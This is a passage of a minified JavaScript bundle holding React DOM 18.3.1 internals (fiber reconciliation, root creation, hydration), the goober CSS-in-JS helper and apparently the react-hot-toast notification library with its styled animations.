    }, iu(l), e;
}
function qh(e, t, n) {
    var r = 3 < arguments.length && void 0 !== arguments[3] ? arguments[3] : null;
    return {
        $$typeof: mn,
        key: null == r ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    };
}
function gf(e) {
    if (!e) return At;
    e: {
        if (sn(e = e._reactInternals) !== e || 1 !== e.tag) throw Error(_(170));
        var t = e;
        do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (we(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e;
                    }
            }
            t = t.return;
        } while (null !== t);
        throw Error(_(171));
    }
    if (1 === e.tag) {
        var n = e.type;
        if (we(n)) return vd(e, n, t);
    }
    return t;
}
function yf(e, t, n, r, o, l, i, s, a) {
    return (e = _u(n, r, !0, e, o, l, i, s, a)).context = gf(null), n = e.current, (l = ut(r = pe(), o = Ot(n))).callback = t !== null && t !== void 0 ? t : null, zt(n, l, o), e.current.lanes = o, Hr(e, o, r), xe(e, r), e;
}
function $l(e, t, n, r) {
    var o = t.current,
        l = pe(),
        i = Ot(o);
    return n = gf(n), null === t.context ? t.context = n : t.pendingContext = n, (t = ut(l, i)).payload = {
        element: e
    }, null !== (r = void 0 === r ? null : r) && (t.callback = r), null !== (e = zt(o, t, i)) && (We(e, o, i, l), Fo(e, o, i)), i;
}
function yl(e) {
    return (e = e.current).child ? (e.child.tag, e.child.stateNode) : null;
}
function Va(e, t) {
    if (null !== (e = e.memoizedState) && null !== e.dehydrated) {
        var n = e.retryLane;
        e.retryLane = 0 !== n && n < t ? n : t;
    }
}
function Cu(e, t) {
    Va(e, t), (e = e.alternate) && Va(e, t);
}
function ev() {
    return null;
}
hf = function (e, t, n) {
    if (null !== e) {
        if (e.memoizedProps !== t.pendingProps || ye.current) ge = !0; else {
            if (!(e.lanes & n || 128 & t.flags)) return ge = !1, Ah(e, t, n);
            ge = !!(131072 & e.flags);
        }
    } else ge = !1, B && 1048576 & t.flags && yd(t, sl, t.index);
    switch (t.lanes = 0, t.tag) {
        case 2:
            var r = t.type;
            bo(e, t), e = t.pendingProps;
            var o = On(t, ce.current);
            In(t, n), o = du(null, t, r, e, o, n);
            var l = fu();
            return t.flags |= 1, "object" == typeof o && null !== o && "function" == typeof o.render && void 0 === o.$$typeof ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, we(r) ? (l = !0, ll(t)) : l = !1, t.memoizedState = null !== o.state && void 0 !== o.state ? o.state : null, iu(t), o.updater = Ol, t.stateNode = o, o._reactInternals = t, ls(t, r, e, n), t = us(null, t, r, !0, l, n)) : (t.tag = 0, B && l && qs(t), fe(null, t, o, n), t = t.child), t;
        case 16:
            r = t.elementType;
            e: {
                switch (bo(e, t), e = t.pendingProps, r = (o = r._init)(r._payload), t.type = r, o = t.tag = Jh(r), e = Fe(r, e), o) {
                    case 0:
                        t = ss(null, t, r, e, n);
                        break e;
                    case 1:
                        t = za(null, t, r, e, n);
                        break e;
                    case 11:
                        t = Ta(null, t, r, e, n);
                        break e;
                    case 14:
                        t = Ia(null, t, r, Fe(r.type, e), n);
                        break e;
                }
                throw Error(_(306, r, ""));
            }
            return t;
        case 0:
            return r = t.type, o = t.pendingProps, ss(e, t, r, o = t.elementType === r ? o : Fe(r, o), n);
        case 1:
            return r = t.type, o = t.pendingProps, za(e, t, r, o = t.elementType === r ? o : Fe(r, o), n);
        case 3:
            e: {
                if (Jd(t), null === e) throw Error(_(387));
                r = t.pendingProps, o = (l = t.memoizedState).element, Cd(e, t), cl(t, r, null, n);
                var i = t.memoizedState;
                if (r = i.element, l.isDehydrated) {
                    if (l = {
                        element: r,
                        isDehydrated: !1,
                        cache: i.cache,
                        pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
                        transitions: i.transitions
                    }, t.updateQueue.baseState = l, t.memoizedState = l, 256 & t.flags) {
                        t = Ra(e, t, r, n, o = $n(Error(_(423)), t));
                        break e;
                    }
                    if (r !== o) {
                        t = Ra(e, t, r, n, o = $n(Error(_(424)), t));
                        break e;
                    }
                    for (_e = It(t.stateNode.containerInfo.firstChild), Ee = t, B = !0, Ue = null, n = kd(t, null, r, n), t.child = n; n;) n.flags = -3 & n.flags | 4096, n = n.sibling;
                } else {
                    if (Mn(), r === o) {
                        t = pt(e, t, n);
                        break e;
                    }
                    fe(e, t, r, n);
                }
                t = t.child;
            }
            return t;
        case 5:
            return Ed(t), null === e && ns(t), r = t.type, o = t.pendingProps, l = null !== e ? e.memoizedProps : null, i = o.children, Ji(r, o) ? i = null : null !== l && Ji(r, l) && (t.flags |= 32), Xd(e, t), fe(e, t, i, n), t.child;
        case 6:
            return null === e && ns(t), null;
        case 13:
            return Zd(e, t, n);
        case 4:
            return su(t, t.stateNode.containerInfo), r = t.pendingProps, null === e ? t.child = Ln(t, null, r, n) : fe(e, t, r, n), t.child;
        case 11:
            return r = t.type, o = t.pendingProps, Ta(e, t, r, o = t.elementType === r ? o : Fe(r, o), n);
        case 7:
            return fe(e, t, t.pendingProps, n), t.child;
        case 8:
        case 12:
            return fe(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, o = t.pendingProps, l = t.memoizedProps, i = o.value, U(ul, r._currentValue), r._currentValue = i, null !== l) if (Be(l.value, i)) {
                    if (l.children === o.children && !ye.current) {
                        t = pt(e, t, n);
                        break e;
                    }
                } else for (null !== (l = t.child) && (l.return = t); null !== l;) {
                    var s = l.dependencies;
                    if (null !== s) {
                        i = l.child;
                        for (var a = s.firstContext; null !== a;) {
                            if (a.context === r) {
                                if (1 === l.tag) {
                                    (a = ut(-1, n & -n)).tag = 2;
                                    var u = l.updateQueue;
                                    if (null !== u) {
                                        var d = (u = u.shared).pending;
                                        null === d ? a.next = a : (a.next = d.next, d.next = a), u.pending = a;
                                    }
                                }
                                l.lanes |= n, null !== (a = l.alternate) && (a.lanes |= n), rs(l.return, n, t), s.lanes |= n;
                                break;
                            }
                            a = a.next;
                        }
                    } else if (10 === l.tag) i = l.type === t.type ? null : l.child; else if (18 === l.tag) {
                        if (null === (i = l.return)) throw Error(_(341));
                        i.lanes |= n, null !== (s = i.alternate) && (s.lanes |= n), rs(i, n, t), i = l.sibling;
                    } else i = l.child;
                    if (null !== i) i.return = l; else for (i = l; null !== i;) {
                        if (i === t) {
                            i = null;
                            break;
                        }
                        if (null !== (l = i.sibling)) {
                            l.return = i.return, i = l;
                            break;
                        }
                        i = i.return;
                    }
                    l = i;
                }
                fe(e, t, o.children, n), t = t.child;
            }
            return t;
        case 9:
            return o = t.type, r = t.pendingProps.children, In(t, n), r = r(o = Le(o)), t.flags |= 1, fe(e, t, r, n), t.child;
        case 14:
            return o = Fe(r = t.type, t.pendingProps), Ia(e, t, r, o = Fe(r.type, o), n);
        case 15:
            return Qd(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : Fe(r, o), bo(e, t), t.tag = 1, we(r) ? (e = !0, ll(t)) : e = !1, In(t, n), Hd(t, r, o), ls(t, r, o, n), us(null, t, r, !0, e, n);
        case 19:
            return qd(e, t, n);
        case 22:
            return Yd(e, t, n);
    }
    throw Error(_(156, t.tag));
};
var wf = "function" == typeof reportError ? reportError : function (e) {
    console.error(e);
};
function Eu(e) {
    this._internalRoot = e;
}
function Fl(e) {
    this._internalRoot = e;
}
function Nu(e) {
    return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType);
}
function Dl(e) {
    return !(!e || 1 !== e.nodeType && 9 !== e.nodeType && 11 !== e.nodeType && (8 !== e.nodeType || " react-mount-point-unstable " !== e.nodeValue));
}
function Wa() { }
function tv(e, t, n, r, o) {
    if (o) {
        if ("function" == typeof r) {
            var l = r;
            r = function () {
                var u = yl(i);
                l.call(u);
            };
        }
        var i = yf(t, r, e, 0, null, !1, !1, "", Wa);
        return e._reactRootContainer = i, e[dt] = i.current, Ir(8 === e.nodeType ? e.parentNode : e), nn(), i;
    }
    for (; o = e.lastChild;) e.removeChild(o);
    if ("function" == typeof r) {
        var s = r;
        r = function () {
            var u = yl(a);
            s.call(u);
        };
    }
    var a = _u(e, 0, !1, null, null, !1, !1, "", Wa);
    return e._reactRootContainer = a, e[dt] = a.current, Ir(8 === e.nodeType ? e.parentNode : e), nn(function () {
        $l(t, a, n, r);
    }), a;
}
function Ul(e, t, n, r, o) {
    var l = n._reactRootContainer;
    if (l) {
        var i = l;
        if ("function" == typeof o) {
            var s = o;
            o = function () {
                var a = yl(i);
                s.call(a);
            };
        }
        $l(t, i, e, o);
    } else i = tv(n, t, e, o, r);
    return yl(i);
}
Fl.prototype.render = Eu.prototype.render = function (e) {
    var t = this._internalRoot;
    if (null === t) throw Error(_(409));
    $l(e, t, null, null);
}, Fl.prototype.unmount = Eu.prototype.unmount = function () {
    var e = this._internalRoot;
    if (null !== e) {
        this._internalRoot = null;
        var t = e.containerInfo;
        nn(function () {
            $l(null, e, null, null);
        }), t[dt] = null;
    }
}, Fl.prototype.unstable_scheduleHydration = function (e) {
    if (e) {
        var t = Yc();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < kt.length && 0 !== t && t < kt[n].priority; n++);
        kt.splice(n, 0, e), 0 === n && Jc(e);
    }
}, Gc = function (e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = dr(t.pendingLanes);
                0 !== n && (Hs(t, 1 | n), xe(t, X()), !(6 & L) && (Fn = X() + 500, Dt()));
            }
            break;
        case 13:
            nn(function () {
                var r = ft(e, 1);
                if (null !== r) {
                    var o = pe();
                    We(r, e, 1, o);
                }
            }), Cu(e, 1);
    }
}, Ks = function (e) {
    if (13 === e.tag) {
        var t = ft(e, 134217728);
        if (null !== t) We(t, e, 134217728, pe());
        Cu(e, 134217728);
    }
}, Qc = function (e) {
    if (13 === e.tag) {
        var t = Ot(e),
            n = ft(e, t);
        if (null !== n) We(n, e, t, pe());
        Cu(e, t);
    }
}, Yc = function () {
    return $;
}, Xc = function (e, t) {
    var n = $;
    try {
        return $ = e, t();
    } finally {
        $ = n;
    }
}, bi = function (e, t, n) {
    switch (t) {
        case "input":
            if (Mi(e, n), t = n.name, "radio" === n.type && null != t) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var o = Il(r);
                        if (!o) throw Error(_(90));
                        Pc(r), Mi(r, o);
                    }
                }
            }
            break;
        case "textarea":
            Tc(e, n);
            break;
        case "select":
            null != (t = n.value) && Nn(e, !!n.multiple, t, !1);
    }
}, Ac = wu, $c = nn;
var nv = {
    usingClientEntryPoint: !1,
    Events: [Gr, wn, Il, Mc, Lc, wu]
},
    ir = {
        findFiberByHostInstance: Kt,
        bundleType: 0,
        version: "18.3.1",
        rendererPackageName: "react-dom"
    },
    rv = {
        bundleType: ir.bundleType,
        version: ir.version,
        rendererPackageName: ir.rendererPackageName,
        rendererConfig: ir.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: ht.ReactCurrentDispatcher,
        findHostInstanceByFiber: function (e) {
            return null === (e = Uc(e)) ? null : e.stateNode;
        },
        findFiberByHostInstance: ir.findFiberByHostInstance || ev,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.3.1-next-f1338f8080-20240426"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var _o = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!_o.isDisabled && _o.supportsFiber) try {
        Nl = _o.inject(rv), qe = _o;
    } catch { }
}
function xf() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || "function" != typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(xf);
    } catch (e) {
        console.error(e);
    }
}
Te.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = nv, Te.createPortal = function (e, t) {
    var n = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : null;
    if (!Nu(t)) throw Error(_(200));
    return qh(e, t, null, n);
}, Te.createRoot = function (e, t) {
    if (!Nu(e)) throw Error(_(299));
    var n = !1,
        r = "",
        o = wf;
    return null != t && (!0 === t.unstable_strictMode && (n = !0), void 0 !== t.identifierPrefix && (r = t.identifierPrefix), void 0 !== t.onRecoverableError && (o = t.onRecoverableError)), t = _u(e, 1, !1, null, null, n, !1, r, o), e[dt] = t.current, Ir(8 === e.nodeType ? e.parentNode : e), new Eu(t);
}, Te.findDOMNode = function (e) {
    if (null == e) return null;
    if (1 === e.nodeType) return e;
    var t = e._reactInternals;
    if (void 0 === t) throw "function" == typeof e.render ? Error(_(188)) : (e = Object.keys(e).join(","), Error(_(268, e)));
    return e = null === (e = Uc(t)) ? null : e.stateNode;
}, Te.flushSync = function (e) {
    return nn(e);
}, Te.hydrate = function (e, t, n) {
    if (!Dl(t)) throw Error(_(200));
    return Ul(null, e, t, !0, n);
}, Te.hydrateRoot = function (e, t, n) {
    var _n2;
    if (!Nu(e)) throw Error(_(405));
    var r = null != n && n.hydratedSources || null,
        o = !1,
        l = "",
        i = wf;
    if (null != n && (!0 === n.unstable_strictMode && (o = !0), void 0 !== n.identifierPrefix && (l = n.identifierPrefix), void 0 !== n.onRecoverableError && (i = n.onRecoverableError)), t = yf(t, null, e, 1, (_n2 = n) !== null && _n2 !== void 0 ? _n2 : null, o, !1, l, i), e[dt] = t.current, Ir(e), r) for (e = 0; e < r.length; e++) o = (o = (n = r[e])._getVersion)(n._source), null == t.mutableSourceEagerHydrationData ? t.mutableSourceEagerHydrationData = [n, o] : t.mutableSourceEagerHydrationData.push(n, o);
    return new Fl(t);
}, Te.render = function (e, t, n) {
    if (!Dl(t)) throw Error(_(200));
    return Ul(null, e, t, !1, n);
}, Te.unmountComponentAtNode = function (e) {
    if (!Dl(e)) throw Error(_(40));
    return !!e._reactRootContainer && (nn(function () {
        Ul(null, null, e, !1, function () {
            e._reactRootContainer = null, e[dt] = null;
        });
    }), !0);
}, Te.unstable_batchedUpdates = wu, Te.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
    if (!Dl(n)) throw Error(_(200));
    if (null == e || void 0 === e._reactInternals) throw Error(_(38));
    return Ul(e, t, n, !1, r);
}, Te.version = "18.3.1-next-f1338f8080-20240426", xf(), wc.exports = Te;
var Sf = wc.exports,
    Ba = Sf;
Pi.createRoot = Ba.createRoot, Pi.hydrateRoot = Ba.hydrateRoot;
let _f,
    xs,
    Ss,
    ov = {
        data: ""
    },
    lv = e => "object" == typeof window ? ((e ? e.querySelector("#_goober") : window._goober) || Object.assign((e || document.head).appendChild(document.createElement("style")), {
        innerHTML: " ",
        id: "_goober"
    })).firstChild : e || ov,
    iv = /(?:([\u0080-\uFFFF\w-%@]+) *:? *([^{;]+?);|([^;}{]*?) *{)|(}\s*)/g,
    sv = /\/\*[^]*?\*\/|  +/g,
    Ha = /\n+/g,
    Ct = (e, t) => {
        let n = "",
            r = "",
            o = "";
        for (let l in e) {
            let i = e[l];
            "@" == l[0] ? "i" == l[1] ? n = l + " " + i + ";" : r += "f" == l[1] ? Ct(i, l) : l + "{" + Ct(i, "k" == l[1] ? "" : t) + "}" : "object" == typeof i ? r += Ct(i, t ? t.replace(/([^,])+/g, s => l.replace(/(^:.*)|([^,])+/g, a => /&/.test(a) ? a.replace(/&/g, s) : s ? s + " " + a : a)) : l) : null != i && (l = /^--/.test(l) ? l : l.replace(/[A-Z]/g, "-$&").toLowerCase(), o += Ct.p ? Ct.p(l, i) : l + ":" + i + ";");
        }
        return n + (t && o ? t + "{" + o + "}" : o) + r;
    },
    nt = {},
    kf = e => {
        if ("object" == typeof e) {
            let t = "";
            for (let n in e) t += n + kf(e[n]);
            return t;
        }
        return e;
    },
    uv = (e, t, n, r, o) => {
        let l = kf(e),
            i = nt[l] || (nt[l] = (a => {
                let u = 0,
                    d = 11;
                for (; u < a.length;) d = 101 * d + a.charCodeAt(u++) >>> 0;
                return "go" + d;
            })(l));
        if (!nt[i]) {
            let a = l !== e ? e : (u => {
                let d,
                    m,
                    p = [{}];
                for (; d = iv.exec(u.replace(sv, ""));) d[4] ? p.shift() : d[3] ? (m = d[3].replace(Ha, " ").trim(), p.unshift(p[0][m] = p[0][m] || {})) : p[0][d[1]] = d[2].replace(Ha, " ").trim();
                return p[0];
            })(e);
            nt[i] = Ct(o ? {
                ["@keyframes " + i]: a
            } : a, n ? "" : "." + i);
        }
        let s = n && nt.g ? nt.g : null;
        return n && (nt.g = nt[i]), a = nt[i], u = t, d = r, (m = s) ? u.data = u.data.replace(m, a) : -1 === u.data.indexOf(a) && (u.data = d ? a + u.data : u.data + a), i;
        var a, u, d, m;
    },
    av = (e, t, n) => e.reduce((r, o, l) => {
        var _i2;
        let i = t[l];
        if (i && i.call) {
            let s = i(n),
                a = s && s.props && s.props.className || /^go/.test(s) && s;
            i = a ? "." + a : s && "object" == typeof s ? s.props ? "" : Ct(s, "") : !1 === s ? "" : s;
        }
        return r + o + ((_i2 = i) !== null && _i2 !== void 0 ? _i2 : "");
    }, "");
function bl(e) {
    let t = this || {},
        n = e.call ? e(t.p) : e;
    return uv(n.unshift ? n.raw ? av(n, [].slice.call(arguments, 1), t.p) : n.reduce((r, o) => Object.assign(r, o && o.call ? o(t.p) : o), {}) : n, lv(t.target), t.g, t.o, t.k);
}
bl.bind({
    g: 1
});
let mt = bl.bind({
    k: 1
});
function cv(e, t, n, r) {
    Ct.p = t, _f = e, xs = n, Ss = r;
}
function Ut(e, t) {
    let n = this || {};
    return function () {
        let r = arguments;
        return function o(l, i) {
            let s = Object.assign({}, l),
                a = s.className || o.className;
            n.p = Object.assign({
                theme: xs && xs()
            }, s), n.o = / *go\d+/.test(a), s.className = bl.apply(n, r) + (a ? " " + a : "");
            let u = e;
            return e[0] && (u = s.as || e, delete s.as), Ss && u[0] && Ss(s), _f(u, s);
        };
    };
}
var dv = e => "function" == typeof e,
    wl = (e, t) => dv(e) ? e(t) : e,
    fv = (() => {
        let e = 0;
        return () => (++e).toString();
    })(),
    Cf = (() => {
        let e;
        return () => {
            if (void 0 === e && typeof window < "u") {
                let t = matchMedia("(prefers-reduced-motion: reduce)");
                e = !t || t.matches;
            }
            return e;
        };
    })(),
    pv = 20,
    Ho = new Map(),
    mv = 1e3,
    Ka = e => {
        if (Ho.has(e)) return;
        let t = setTimeout(() => {
            Ho.delete(e), un({
                type: 4,
                toastId: e
            });
        }, mv);
        Ho.set(e, t);
    },
    hv = e => {
        let t = Ho.get(e);
        t && clearTimeout(t);
    },
    ks = (e, t) => {
        switch (t.type) {
            case 0:
                return {
                    ...e,
                    toasts: [t.toast, ...e.toasts].slice(0, pv)
                };
            case 1:
                return t.toast.id && hv(t.toast.id), {
                    ...e,
                    toasts: e.toasts.map(l => l.id === t.toast.id ? {
                        ...l,
                        ...t.toast
                    } : l)
                };
            case 2:
                let {
                    toast: n
                } = t;
                return e.toasts.find(l => l.id === n.id) ? ks(e, {
                    type: 1,
                    toast: n
                }) : ks(e, {
                    type: 0,
                    toast: n
                });
            case 3:
                let {
                    toastId: r
                } = t;
                return r ? Ka(r) : e.toasts.forEach(l => {
                    Ka(l.id);
                }), {
                    ...e,
                    toasts: e.toasts.map(l => l.id === r || void 0 === r ? {
                        ...l,
                        visible: !1
                    } : l)
                };
            case 4:
                return void 0 === t.toastId ? {
                    ...e,
                    toasts: []
                } : {
                    ...e,
                    toasts: e.toasts.filter(l => l.id !== t.toastId)
                };
            case 5:
                return {
                    ...e,
                    pausedAt: t.time
                };
            case 6:
                let o = t.time - (e.pausedAt || 0);
                return {
                    ...e,
                    pausedAt: void 0,
                    toasts: e.toasts.map(l => ({
                        ...l,
                        pauseDuration: l.pauseDuration + o
                    }))
                };
        }
    },
    Ko = [],
    Go = {
        toasts: [],
        pausedAt: void 0
    },
    un = e => {
        Go = ks(Go, e), Ko.forEach(t => {
            t(Go);
        });
    },
    vv = {
        blank: 4e3,
        error: 4e3,
        success: 2e3,
        loading: 1 / 0,
        custom: 4e3
    },
    gv = (e = {}) => {
        let [t, n] = x.useState(Go);
        x.useEffect(() => (Ko.push(n), () => {
            let o = Ko.indexOf(n);
            o > -1 && Ko.splice(o, 1);
        }), [t]);
        let r = t.toasts.map(o => {
            var l, i;
            return {
                ...e,
                ...e[o.type],
                ...o,
                duration: o.duration || (null == (l = e[o.type]) ? void 0 : l.duration) || (null == e ? void 0 : e.duration) || vv[o.type],
                style: {
                    ...e.style,
                    ...(null == (i = e[o.type]) ? void 0 : i.style),
                    ...o.style
                }
            };
        });
        return {
            ...t,
            toasts: r
        };
    },
    yv = (e, t = "blank", n) => ({
        createdAt: Date.now(),
        visible: !0,
        type: t,
        ariaProps: {
            role: "status",
            "aria-live": "polite"
        },
        message: e,
        pauseDuration: 0,
        ...n,
        id: (null == n ? void 0 : n.id) || fv()
    }),
    Yr = e => (t, n) => {
        let r = yv(t, e, n);
        return un({
            type: 2,
            toast: r
        }), r.id;
    },
    Ce = (e, t) => Yr("blank")(e, t);
Ce.error = Yr("error"), Ce.success = Yr("success"), Ce.loading = Yr("loading"), Ce.custom = Yr("custom"), Ce.dismiss = e => {
    un({
        type: 3,
        toastId: e
    });
}, Ce.remove = e => un({
    type: 4,
    toastId: e
}), Ce.promise = (e, t, n) => {
    let r = Ce.loading(t.loading, {
        ...n,
        ...(null == n ? void 0 : n.loading)
    });
    return e.then(o => (Ce.success(wl(t.success, o), {
        id: r,
        ...n,
        ...(null == n ? void 0 : n.success)
    }), o)).catch(o => {
        Ce.error(wl(t.error, o), {
            id: r,
            ...n,
            ...(null == n ? void 0 : n.error)
        });
    }), e;
};
var wv = (e, t) => {
    un({
        type: 1,
        toast: {
            id: e,
            height: t
        }
    });
},
    xv = () => {
        un({
            type: 5,
            time: Date.now()
        });
    },
    Sv = e => {
        let {
            toasts: t,
            pausedAt: n
        } = gv(e);
        x.useEffect(() => {
            if (n) return;
            let l = Date.now(),
                i = t.map(s => {
                    if (s.duration === 1 / 0) return;
                    let a = (s.duration || 0) + s.pauseDuration - (l - s.createdAt);
                    if (!(a < 0)) return setTimeout(() => Ce.dismiss(s.id), a);
                    s.visible && Ce.dismiss(s.id);
                });
            return () => {
                i.forEach(s => s && clearTimeout(s));
            };
        }, [t, n]);
        let r = x.useCallback(() => {
            n && un({
                type: 6,
                time: Date.now()
            });
        }, [n]),
            o = x.useCallback((l, i) => {
                let {
                    reverseOrder: s = !1,
                    gutter: a = 8,
                    defaultPosition: u
                } = i || {},
                    d = t.filter(g => (g.position || u) === (l.position || u) && g.height),
                    m = d.findIndex(g => g.id === l.id),
                    p = d.filter((g, w) => w < m && g.visible).length;
                return d.filter(g => g.visible).slice(...(s ? [p + 1] : [0, p])).reduce((g, w) => g + (w.height || 0) + a, 0);
            }, [t]);
        return {
            toasts: t,
            handlers: {
                updateHeight: wv,
                startPause: xv,
                endPause: r,
                calculateOffset: o
            }
        };
    },
    kv = mt`
  from {
    transform: scale(0) rotate(45deg);
     opacity: 0;
  }
  to {
   transform: scale(1) rotate(45deg);
    opacity: 1;
  }`,
    _v = mt`
  from {
    transform: scale(0);
    opacity: 0;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }`,
    Cv = mt`
  from {
    transform: scale(0) rotate(90deg);
     opacity: 0;
  }
  to {
    transform: scale(1) rotate(90deg);
     opacity: 1;
  }`,
    Ev = Ut("div")`
    width: 20px;
    opacity: 0;
    height: 20px;
    border-radius: 10px;
    background: ${e => e.primary || "#ff4b4b"};
    position: relative;
    transform: rotate(45deg);
  
    animation: ${kv} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
      forwards;
    animation-delay: 100ms;
  
    &:after,
    &:before {
      content: '';
      animation: ${_v} 0.15s ease-out forwards;
      animation-delay: 150ms;
      position: absolute;
      border-radius: 3px;
      opacity: 0;
      background: ${e => e.secondary || "#fff"};
      bottom: 9px;
      left: 4px;
      height: 2px;
      width: 12px;
    }
  
    &:before {
      animation: ${Cv} 0.15s ease-out forwards;
      animation-delay: 180ms;
      transform: rotate(90deg);
    }
  `,
    Nv = mt`
    from {
      transform: rotate(0deg);
    }
    to {
      transform: rotate(360deg);
    }
  `,
    Pv = Ut("div")`
    width: 12px;
    height: 12px;
    box-sizing: border-box;
    border: 2px solid;
    border-radius: 100%;
    border-color: ${e => e.secondary || "#e0e0e0"};
    border-right-color: ${e => e.primary || "#616161"};
    animation: ${Nv} 1s linear infinite;
  `,
    jv = mt`
  from {
    transform: scale(0) rotate(45deg);
     opacity: 0;
  }
  to {
    transform: scale(1) rotate(45deg);
     opacity: 1;
  }`,
    Tv = mt`
  0% {
     height: 0;
     width: 0;
     opacity: 0;
  }
  40% {
    height: 0;
     width: 6px;
     opacity: 1;
  }
  100% {
    opacity: 1;
    height: 10px;
  }`,
    Iv = Ut("div")`
    width: 20px;
    opacity: 0;
    height: 20px;
    border-radius: 10px;
    background: ${e => e.primary || "#61d345"};
    position: relative;
    transform: rotate(45deg);
  
    animation: ${jv} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
      forwards;
    animation-delay: 100ms;
    &:after {
      content: '';
      box-sizing: border-box;
      animation: ${Tv} 0.2s ease-out forwards;
      opacity: 0;
      animation-delay: 200ms;
      position: absolute;
      border-right: 2px solid;
      border-bottom: 2px solid;
      border-color: ${e => e.secondary || "#fff"};
      bottom: 6px;
      left: 6px;
      height: 10px;
      width: 6px;
    }
  `,
    zv = Ut("div")`
    position: absolute;
  `,
    Rv = Ut("div")`
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    min-width: 20px;
    min-height: 20px;
  `,
    Ov = mt`
  from {
    transform: scale(0.6);
    opacity: 0.4;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }`,
    Mv = Ut("div")`
    position: relative;
    transform: scale(0.6);
    opacity: 0.4;
    min-width: 20px;
    animation: ${Ov} 0.3s 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275)
      forwards;
  `,
    Lv = ({
        toast: e
    }) => {
        let {
            icon: t,
            type: n,
            iconTheme: r
        } = e;
        return void 0 !== t ? "string" == typeof t ? x.createElement(Mv, null, t) : t : "blank" === n ? null : x.createElement(Rv, null, x.createElement(Pv, {
            ...r
        }), "loading" !== n && x.createElement(zv, null, "error" === n ? x.createElement(Ev, {
            ...r
        }) : x.createElement(Iv, {
            ...r
        })));
    },
    Av = e => `\n0% {transform: translate3d(0,${-200 * e}%,0) scale(.6); opacity:.5;}\n100% {transform: translate3d(0,0,0) scale(1); opacity:1;}\n`,
    $v = e => `\n0% {transform: translate3d(0,0,-1px) scale(1); opacity:1;}\n100% {transform: translate3d(0,${-150 * e}%,-1px) scale(.6); opacity:0;}\n`,
    Fv = "0%{opacity:0;} 100%{opacity:1;}",
    Dv = "0%{opacity:1;} 100%{opacity:0;}",
    Uv = Ut("div")`
    display: flex;
    align-items: center;
    background: #fff;
    color: #363636;
    line-height: 1.3;
    will-change: transform;
    box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);
    max-width: 350px;
    pointer-events: auto;
    padding: 8px 10px;
    border-radius: 8px;
  `,
    bv = Ut("div")`
    display: flex;
    justify-content: center;
    margin: 4px 10px;
    color: inherit;
    flex: 1 1 auto;
    white-space: pre-line;
  `,
    Vv = (e, t) => {
        let n = e.includes("top") ? 1 : -1,
            [r, o] = Cf() ? [Fv, Dv] : [Av(n), $v(n)];
        return {
            animation: t ? `${mt(r)} 0.35s cubic-bezier(.21,1.02,.73,1) forwards` : `${mt(o)} 0.4s forwards cubic-bezier(.06,.71,.55,1)`
        };
    },
    Wv = x.memo(({
        toast: e,
        position: t,
        style: n,
        children: r
    }) => {
        let o = e.height ? Vv(e.position || t || "top-center", e.visible) : {
            opacity: 0
        },
            l = x.createElement(Lv, {
                toast: e
            }),
            i = x.createElement(bv, {
                ...e.ariaProps
            }, wl(e.message, e));
        return x.createElement(Uv, {
            className: e.className,
            style: {
                ...o,
                ...n,
                ...e.style
            }
        }, "function" == typeof r ? r({
            icon: l,
            message: i
        }) : x.createElement(x.Fragment, null, l, i));
    });
cv(x.createElement);
var Bv = ({
    id: e,
    className: t,
    style: n,
    onHeightUpdate: r,
    children: o
}) => {
    let l = x.useCallback(i => {
        if (i) {
            let s = () => {
                let a = i.getBoundingClientRect().height;
                r(e, a);
            };
            s(), new MutationObserver(s).observe(i, {
                subtree: !0,
                childList: !0,
                characterData: !0
            });
        }
    }, [e, r]);
    return x.createElement("div", {
        ref: l,
        className: t,
        style: n
    }, o);
},
    Hv = (e, t) => {
        let n = e.includes("top"),
            r = n ? {
                top: 0
            } : {
                bottom: 0
            },
            o = e.includes("center") ? {
                justifyContent: "center"
            } : e.includes("right") ? {
                justifyContent: "flex-end"
            } : {};
        return {
            left: 0,
            right: 0,
            display: "flex",
            position: "absolute",
            transition: Cf() ? void 0 : "all 230ms cubic-bezier(.21,1.02,.73,1)",
            transform: `translateY(${t * (n ? 1 : -1)}px)`,
            ...r,
            ...o
        };
    },
    Kv = bl`
    z-index: 9999;
    > * {
      pointer-events: auto;
    }
  `,
